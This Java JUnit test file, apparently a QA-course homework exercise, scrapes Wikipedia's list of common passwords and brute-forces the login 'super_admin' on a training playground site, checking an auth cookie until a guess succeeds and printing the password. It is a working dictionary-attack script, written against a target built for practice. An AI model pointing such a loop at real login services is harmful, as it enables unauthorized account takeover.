package tests;

import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;
import org.junit.jupiter.api.Test;

import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class PasswordGuessingTest {

    @Test
    public void testPasswordGuessing() throws IOException {

        List<String> passList = new ArrayList<>();

        //getting the List of passwords from wiki

        Document doc = Jsoup.connect("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords").get();
        Elements tables = doc.select(".wikitable");
        Elements rows = tables.get(1).getElementsByTag("tr");

        for (Element row : rows) {
            Elements tds = row.getElementsByTag("td");
            for (int i = 1; i < tds.size(); i++) {
                if (!passList.contains(tds.get(i).text())) {
                    passList.add(tds.get(i).text());
                }
            }
        }

        //Guessing the password

        for (String a : passList) {
            Map<String, String> params = new HashMap<>();
            params.put("login", "super_admin");
            params.put("password", a);

            Response responseCookie = RestAssured
                    .given()
                    .body(params)
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();

            String cookie = responseCookie.getCookie("auth_cookie");

            Map<String, String> auth_cookie = new HashMap<>();
            if (cookie != null) {
                auth_cookie.put("auth_cookie", cookie);
            }

            Response responseForCheck = RestAssured
                    .given()
                    .cookies(auth_cookie)
                    .when()
                    .get("https://playground.learnqa.ru/api/check_auth_cookie")
                    .andReturn();

            if (!responseForCheck.getBody().asString().equals("You are NOT authorized")) {
                responseForCheck.print();
                System.out.println("The correct password is " + a);
                break;
            }
        }
    }
}
